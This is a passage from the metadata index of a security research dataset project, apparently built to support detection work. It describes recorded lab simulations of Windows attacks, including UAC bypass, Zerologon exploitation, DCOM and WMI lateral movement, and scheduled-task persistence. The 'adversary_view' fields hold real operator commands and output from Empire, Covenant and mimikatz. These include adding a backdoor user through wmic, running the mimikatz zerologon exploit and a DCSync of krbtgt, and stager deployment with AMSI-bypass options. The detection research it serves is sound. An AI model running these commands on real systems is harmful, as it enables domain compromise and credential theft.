                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/privilege_escalation/host/empire_uac_shellapi_fodhelper.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "bypassuac_fodhelper",
                    "script": "https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/privesc/Invoke-FodHelperBypass.ps1"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(Empire: SP7B3U2X) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nKU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5376   5/0.0    2020-09-04 07:07:17  http            \nSP7B3U2X ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         1376   5/0.0    2020-09-04 07:12:15  http            \n\n(Empire: agents) > interact SP7B3U2X\n(Empire: SP7B3U2X) > \n(Empire: SP7B3U2X) > usemodule privesc/bypassuac_fodhelper\n(Empire: powershell/privesc/bypassuac_fodhelper) > info\n\n              Name: Invoke-FodHelperBypass\n            Module: powershell/privesc/bypassuac_fodhelper\n        NeedsAdmin: False\n        OpsecSafe: False\n          Language: powershell\nMinLanguageVersion: 2\n        Background: True\n  OutputExtension: None\n\nAuthors:\n  Petr Medonos\n\nDescription:\n  Bypasses UAC by performing an registry modification for\n  FodHelper (based\n  onhttps://winscripting.blog/2017/05/12/first-entry-welcome-\n  and-uac-bypass/)\n\nComments:\n  https://winscripting.blog/2017/05/12/first-entry-welcome-\n  and-uac-bypass/\n\nOptions:\n\n  Name             Required    Value                     Description\n  ----             --------    -------                   -----------\n  Agent            True        SP7B3U2X                  Agent to run module on.                 \n  Listener         True                                  Listener to use.                        \n  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n                                                        powershell code, uses the               \n                                                        ObfuscateCommand for obfuscation types. \n                                                        For powershell only.                    \n  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n                                                        Only used if Obfuscate switch is True.  \n                                                        For powershell only.                    \n  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n                                                        the stager code.                        \n  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n                                                        the stager code.                        \n  UserAgent        False       default                   User-agent string to use for the staging\n                                                        request (default, none, or other).      \n  Proxy            False       default                   Proxy to use for request (default, none,\n                                                        or other).                              \n  ProxyCreds       False       default                   Proxy credentials                       \n                                                        ([domain\\]username:password) to use for \n                                                        request (default, none, or other).      \n\n(Empire: powershell/privesc/bypassuac_fodhelper) > set Listener http\n(Empire: powershell/privesc/bypassuac_fodhelper) > execute\n[>] Module is not opsec safe, run? [y/N] y\n[*] Tasked SP7B3U2X to run TASK_CMD_JOB\n[*] Agent SP7B3U2X tasked with task ID 2\n[*] Tasked agent SP7B3U2X to run module powershell/privesc/bypassuac_fodhelper\n(Empire: powershell/privesc/bypassuac_fodhelper) > \nJob started: EHNK23\n\n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n[*] New agent F2X6GE4R checked in\n[+] Initial agent F2X6GE4R from 172.18.39.5 now active (Slack)\n[*] Sending agent (stage 2) to F2X6GE4R at 172.18.39.5\n\n(Empire: powershell/privesc/bypassuac_fodhelper) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nKU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5376   5/0.0    2020-09-04 07:07:17  http            \nSP7B3U2X ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         1376   5/0.0    2020-09-04 07:30:33  http            \nF2X6GE4R ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         3936   5/0.0    2020-09-04 07:30:34  http            \n\n\n(Empire: agents) > interact F2X6GE4R\n(Empire: F2X6GE4R) > shell whoami\n[*] Tasked F2X6GE4R to run TASK_SHELL\n[*] Agent F2X6GE4R tasked with task ID 1\n(Empire: F2X6GE4R) > \ntheshire\\pgustavo\n..Command execution"
        },
        "references": [
            "https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/"
        ],
        "mp_last_updated": "2022-01-08T01:49:43.600930+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200914080546.yaml": {
        "title": "Empire Remote WMIC Add User",
        "id": "SDWIN-200914080546",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/09/14",
        "modification_date": "2020/09/22",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "WMI IWbemServices ExecMethod",
            "User Backdoor"
        ],
        "description": "This dataset represents an adversary remotely executing code via WMI to ad a backdoor user on the target system. This dataset focuses on the use of the WMI Win32_Process class and method Create to execute code remotely.",
        "attack_mappings": [
            {
                "technique": "T1047",
                "sub-technique": null,
                "tactics": [
                    "TA0002",
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_wmic_add_user_backdoor.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "shell",
                    "script": null
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(Empire: agents) > \n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n[*] New agent 6Z78CY25 checked in\n[+] Initial agent 6Z78CY25 from 172.18.39.5 now active (Slack)\n[*] Sending agent (stage 2) to 6Z78CY25 at 172.18.39.5\nagents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nKFL6CMNZ ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7584   5/0.0    2020-09-14 11:33:59  http            \nYGBLW8EM ps 172.18.39.5     WORKSTATION5      *THESHIRE\\wardog        powershell         8924   5/0.0    2020-09-14 11:40:53  http            \nUBCKLYFA ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5412   5/0.0    2020-09-14 11:57:16  http            \n\n6Z78CY25 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         9564   5/0.0    2020-09-14 12:02:08  http            \n\n(Empire: agents) > interact 6Z78CY25\n(Empire: 6Z78CY25) > \n(Empire: 6Z78CY25) > shell wmic /node:WORKSTATION6 process call create \"net user /add backdoor [PLACEHOLDER]\"\n[*] Tasked 6Z78CY25 to run TASK_SHELL\n[*] Agent 6Z78CY25 tasked with task ID 1\n(Empire: 6Z78CY25) > \nExecuting (Win32_Process)->Create()\n\nMethod execution successful.\n\nOut Parameters:\ninstance of __PARAMETERS\n{\n  ProcessId = 7768;\n  ReturnValue = 0;\n};\n\n..Command execution completed.\n\n(Empire: 6Z78CY25) >"
        },
        "references": [
            "https://blog.f-secure.com/endpoint-detection-of-remote-service-creation-and-psexec/"
        ],
        "mp_last_updated": "2022-01-08T01:49:43.830931+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200916232559.yaml": {
        "title": "Mimikatz Netlogon Unauthenticated NetrServerAuthenticate2",
        "id": "SDWIN-200916232559",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/09/16",
        "modification_date": "2020/09/16",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "CVE-2020-1472",
            "Password Update",
            "Netlogon Insecure AES-CFB8"
        ],
        "description": "This dataset represents adversaries leveraging a vulnerability (CVE-2020-1472) in a cryptographic authentication scheme used by the Netlogon Remote Protocol, which among other things can be used to update computer passwords. This vulnerability was discovered by [@@SecuraBV](https://twitter.com/SecuraBV).",
        "attack_mappings": [
            {
                "technique": "T1210",
                "sub-technique": null,
                "tactics": [
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "ShellCmd",
                    "script": "https://github.com/cobbr/Covenant/blob/7555b19ffb9401c0e37094c25e404a640b1688d7/Covenant/Data/Tasks/SharpSploit.Execution.yaml#L96"
                },
                {
                    "type": "tool",
                    "name": "mimikatz",
                    "module": "lsadump",
                    "script": "https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L23"
                },
                {
                    "type": "tool",
                    "name": "SharpZeroLogon",
                    "module": "SharpZeroLogon",
                    "script": "https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "Mimikatz Implementation (NetrServerAuthenticate2)\n=================================================\n\n(wardog) > ShellCmd /shellcommand:\"C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe \\\"lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\\\" exit\"\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 16 2020 12:02:22\n.## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\n\nmimikatz(commandline) # lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\n\nTarget : MORDORDC.theshire.local\nAccount: MORDORDC$\nType   : 6 (Server)\nMode   : exploit\n\nTrying to 'authenticate'...\n====================================================\n\nNetrServerAuthenticate2: 0x00000000\nNetrServerPasswordSet2 : 0x00000000\n\n* Authentication: OK -- vulnerable\n* Set password  : OK -- may be unstable\n\nmimikatz(commandline) # exit\n\nBye!\n\nDCSync Follow-up (Optional)\n(wardog) > ShellCmd /shellcommand:\"C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe \\\"lsadump::dcsync /domain:theshire.local /dc:MORDORDC.theshire.local /user:krbtgt /authuser:MORDORDC$ /authdomain:theshire /authpassword:\\\\\"\\\\\" /authntlm\\\" exit\""
        },
        "references": [
            "https://www.secura.com/blog/zero-logon",
            "https://www.secura.com/pathtoimg.php?id=2055",
            "https://twitter.com/gentilkiwi/status/1306178689630076929",
            "https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon",
            "https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc#theGroupPolicy"
        ],
        "mp_last_updated": "2022-01-08T01:49:44.033932+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200917174542.yaml": {
        "title": "DCOM ExecuteExcel4macro",
        "id": "SDWIN-200917174542",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/09/18",
        "modification_date": "2020/09/18",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "DCOM"
        ],
        "description": "This dataset represents adversaries leveraging the COM Method ExecuteExcel4Macro over DCOM to execute Excel4 macros remotely",
        "attack_mappings": [
            {
                "technique": "T1021",
                "sub-technique": "003",
                "tactics": [
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_dcom_executeexcel4macro_allowed.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_dcom_executeexcel4macro_allowed.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "ShellCmd",
                    "script": "https://github.com/cobbr/Covenant/blob/7555b19ffb9401c0e37094c25e404a640b1688d7/Covenant/Data/Tasks/SharpSploit.Execution.yaml#L96"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(wardog) > ShellCmd /shellcommand:\"C:\\Users\\pgustavo\\Desktop\\MoveExcel4.exe 172.18.39.6"
        },
        "references": [
            "https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-2-dcom/",
            "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_dcom_executeexcel4macro_blocked.zip",
            [
                "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_dcom_executeexcel4macro_blocked.zip"
            ]
        ],
        "mp_last_updated": "2022-01-08T01:49:44.237930+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200918145959.yaml": {
        "title": "DCOM RegisterXLL",
        "id": "SDWIN-200918145959",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/09/18",
        "modification_date": "2020/09/18",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "DCOM"
        ],
        "description": "This dataset represents adversaries leveraging the COM Method RegisterXLL over DCOM to execute an XLL file remotely. The XLL file can exist on the target or externally in an UNC path such as \\\\SERVER\\FILES\\.",
        "attack_mappings": [
            {
                "technique": "T1021",
                "sub-technique": "003",
                "tactics": [
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/covenant_dcom_registerxll.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/covenant_dcom_registerxll.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Covenant",
                    "module": "ShellCmd",
                    "script": "https://github.com/cobbr/Covenant/blob/7555b19ffb9401c0e37094c25e404a640b1688d7/Covenant/Data/Tasks/SharpSploit.Execution.yaml#L96"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(wardog) > ShellCmd /shellcommand:\"C:\\Users\\pgustavo\\Desktop\\MoveExcelXLL.exe 172.18.39.6 C:\\\\programdata\\calc.xll"
        },
        "references": [
            "https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-2-dcom/"
        ],
        "mp_last_updated": "2022-01-08T01:49:44.427930+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200921001437.yaml": {
        "title": "Empire Invoke WMI",
        "id": "SDWIN-200921001437",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/09/21",
        "modification_date": "2020/09/22",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "WMI IWbemServices ExecMethod"
        ],
        "description": "This dataset represents an adversary remotely executing code via WMI. This dataset focuses on the use of the WMI Win32_Process class and method Create to execute code remotely.",
        "attack_mappings": [
            {
                "technique": "T1047",
                "sub-technique": null,
                "tactics": [
                    "TA0002",
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "lateral_movement",
                    "script": "https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/lateral_movement/invoke_wmi.py"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(Empire: agents) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http            \n\nAWTK7BX5 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         2228   5/0.0    2020-09-21 04:06:27  http            \n\n(Empire: agents) > interact AWTK7BX5\n(Empire: AWTK7BX5) > usemodule lateral_movement/invoke_wmi\n(Empire: powershell/lateral_movement/invoke_wmi) > set Listener http\n(Empire: powershell/lateral_movement/invoke_wmi) > set ComputerName WORKSTATION6.theshire.local\n(Empire: powershell/lateral_movement/invoke_wmi) > info\n\n              Name: Invoke-WMI\n            Module: powershell/lateral_movement/invoke_wmi\n        NeedsAdmin: False\n        OpsecSafe: True\n          Language: powershell\nMinLanguageVersion: 2\n        Background: False\n  OutputExtension: None\n\nAuthors:\n  @harmj0y\n\nDescription:\n  Executes a stager on remote hosts using WMI.\n\nOptions:\n\n  Name             Required    Value                     Description\n  ----             --------    -------                   -----------\n  Agent            True        AWTK7BX5                  Agent to run module on.                 \n  CredID           False                                 CredID from the store to use.           \n  ComputerName     True        WORKSTATION6.theshire.lo  Host[s] to execute the stager on, comma \n                              cal                       separated.                              \n  Listener         False       http                      Listener to use.                        \n  Command          False                                 Custom command to run.                  \n  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n                                                        powershell code, uses the               \n                                                        ObfuscateCommand for obfuscation types. \n                                                        For powershell only.                    \n  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n                                                        Only used if Obfuscate switch is True.  \n                                                        For powershell only.                    \n  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n                                                        the stager code.                        \n  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n                                                        the stager code.                        \n  UserName         False                                 [domain\\]username to use to execute     \n                                                        command.                                \n  Password         False                                 Password to use to execute command.     \n  UserAgent        False       default                   User-agent string to use for the staging\n                                                        request (default, none, or other).      \n  Proxy            False       default                   Proxy to use for request (default, none,\n                                                        or other).                              \n  ProxyCreds       False       default                   Proxy credentials                       \n                                                        ([domain\\]username:password) to use for \n                                                        request (default, none, or other).      \n\n(Empire: powershell/lateral_movement/invoke_wmi) > execute\n[*] Tasked AWTK7BX5 to run TASK_CMD_WAIT\n[*] Agent AWTK7BX5 tasked with task ID 3\n[*] Tasked agent AWTK7BX5 to run module powershell/lateral_movement/invoke_wmi\n(Empire: powershell/lateral_movement/invoke_wmi) > \n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6\n[*] New agent EHUNP61R checked in\n[+] Initial agent EHUNP61R from 172.18.39.6 now active (Slack)\n[*] Sending agent (stage 2) to EHUNP61R at 172.18.39.6\n\n(Empire: powershell/lateral_movement/invoke_wmi) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http            \n\nAWTK7BX5 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         2228   5/0.0    2020-09-21 04:14:58  http            \nEHUNP61R ps 172.18.39.6     WORKSTATION6      *THESHIRE\\pgustavo      powershell         9804   5/0.0    2020-09-21 04:14:56  http            \n\n(Empire: agents) > interact EHUNP61R\n(Empire: EHUNP61R) > shell whoami\n[*] Tasked EHUNP61R to run TASK_SHELL\n[*] Agent EHUNP61R tasked with task ID 1\n(Empire: EHUNP61R) > \ntheshire\\pgustavo\n\n..Command execution completed.\n\n(Empire: EHUNP61R) >"
        },
        "references": [
            "https://blog.f-secure.com/endpoint-detection-of-remote-service-creation-and-psexec/"
        ],
        "mp_last_updated": "2022-01-08T01:49:47.991444+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200921175806.yaml": {
        "title": "Empire Elevated Scheduled Tasks",
        "id": "SDWIN-200921175806",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/09/21",
        "modification_date": "2020/09/21",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Local Scheduled Tasks"
        ],
        "description": "This dataset represents adversaries creating and/or executing local scheduled tasks to maintain persistence in an environment.",
        "attack_mappings": [
            {
                "technique": "T1053",
                "sub-technique": "005",
                "tactics": [
                    "TA0003"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/empire_schtasks_creation_execution_elevated_user.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "schtasks",
                    "script": "https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "Empire: agents) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------          \n5LKFT4WY ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7172   5/0.0    2020-09-21 21:28:46  http            \nM43EPU58 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5088   5/0.0    2020-09-21 21:43:06  http            \n\n4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:57:21  http            \n\n(Empire: agents) > interact 4SUZ8X62\n(Empire: 4SUZ8X62) > usemodule persistence/elevated/schtasks*\n(Empire: powershell/persistence/elevated/schtasks) > set AMSIBypass2 True\n(Empire: powershell/persistence/elevated/schtasks) > set TaskName MordorElevated\n(Empire: powershell/persistence/elevated/schtasks) > info\n\n              Name: Invoke-Schtasks\n            Module: powershell/persistence/elevated/schtasks\n        NeedsAdmin: True\n        OpsecSafe: False\n          Language: powershell\nMinLanguageVersion: 2\n        Background: False\n  OutputExtension: None\n\nAuthors:\n  @mattifestation\n  @harmj0y\n\nDescription:\n  Persist a stager (or script) using schtasks running as\n  SYSTEM. This has a moderate detection/removal rating.\n\nComments:\n  https://github.com/mattifestation/PowerSploit/blob/master/Pe\n  rsistence/Persistence.psm1\n\nOptions:\n\n  Name             Required    Value                     Description\n  ----             --------    -------                   -----------\n  Agent            True        4SUZ8X62                  Agent to run module on.                 \n  Listener         False       http                      Listener to use.                        \n  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n                                                        powershell code, uses the               \n                                                        ObfuscateCommand for obfuscation types. \n                                                        For powershell only.                    \n  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n                                                        Only used if Obfuscate switch is True.  \n                                                        For powershell only.                    \n  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n                                                        the stager code.                        \n  AMSIBypass2      False       True                     Include Tal Liberman's AMSI Bypass in   \n                                                        the stager code.                        \n  DailyTime        False                                 Daily time to trigger the script        \n                                                        (HH:mm).                                \n  IdleTime         False                                 User idle time (in minutes) to trigger  \n                                                        script.                                 \n  OnLogon          False       True                      Switch. Trigger script on user logon.   \n  TaskName         True        MordorElevated            Name to use for the schtask.            \n  RegPath          False       HKLM:\\Software\\Microsoft  Registry location to store the script   \n                              \\Network\\debug            code. Last element is the key name.     \n  ADSPath          False                                 Alternate-data-stream location to store \n                                                        the script code.                        \n  ExtFile          False                                 Use an external file for the payload    \n                                                        instead of a stager.                    \n  Cleanup          False                                 Switch. Cleanup the trigger and any     \n                                                        script from specified location.         \n  UserAgent        False       default                   User-agent string to use for the staging\n                                                        request (default, none, or other).      \n  Proxy            False       default                   Proxy to use for request (default, none,\n                                                        or other).                              \n  ProxyCreds       False       default                   Proxy credentials                       \n                                                        ([domain\\]username:password) to use for \n                                                        request (default, none, or other).      \n\n(Empire: powershell/persistence/elevated/schtasks) > execute\n[>] Module is not opsec safe, run? [y/N] y\n[*] Tasked 4SUZ8X62 to run TASK_CMD_WAIT\n[*] Agent 4SUZ8X62 tasked with task ID 1\n[*] Tasked agent 4SUZ8X62 to run module powershell/persistence/elevated/schtasks\n(Empire: powershell/persistence/elevated/schtasks) > \nSUCCESS: The scheduled task \"MordorElevated\" has successfully been created.\nSchtasks persistence established using listener http stored in HKLM:\\Software\\Microsoft\\Network\\debug with MordorElevated OnLogon trigger.\n\n(Empire: powershell/persistence/elevated/schtasks) > back\n(Empire: 4SUZ8X62) > shell shutdown /r\n[*] Tasked 4SUZ8X62 to run TASK_SHELL\n[*] Agent 4SUZ8X62 tasked with task ID 2\n(Empire: 4SUZ8X62) > \n..Command execution completed.\n\n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n\n[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n[*] New agent Y2ADR48N checked in\n[*] New agent D43KCT91 checked in\n[+] Initial agent Y2ADR48N from 172.18.39.5 now active (Slack)\n[*] Sending agent (stage 2) to Y2ADR48N at 172.18.39.5\n[+] Initial agent D43KCT91 from 172.18.39.5 now active (Slack)\n[*] Sending agent (stage 2) to D43KCT91 at 172.18.39.5\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------          \n5LKFT4WY ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7172   5/0.0    2020-09-21 21:28:46  http            \nM43EPU58 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5088   5/0.0    2020-09-21 21:43:06  http            \n\n4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:59:29  http            \nY2ADR48N ps 172.18.39.5     WORKSTATION5      *THESHIRE\\SYSTEM        powershell         620    5/0.0    2020-09-21 22:01:50  http            \nD43KCT91 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\SYSTEM        powershell         636    5/0.0    2020-09-21 22:01:51  http            \n\n(Empire: agents) > "
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:48.251668+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-200921230246.yaml": {
        "title": "Rubeus Elevated ASKTGT CreateNetOnly",
        "id": "SDWIN-200921230246",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/03/19",
        "modification_date": "2020/09/21",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Over-Pass-The-Hash",
            "Not Touching LSASS"
        ],
        "description": "This dataset represents adversaries crafting raw AS-REQ (TGT request) traffic for a specific user and encryption key (/rc4, /aes128, /aes256, or /des) to request TGTs without touching lsass.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": "003",
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_shell_rubeus_asktgt_createnetonly.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/empire_shell_rubeus_asktgt_createnetonly.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "shell",
                    "script": null
                },
                {
                    "type": "binary",
                    "name": "Rubeus",
                    "module": "asktgt",
                    "script": "https://github.com/GhostPack/Rubeus"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
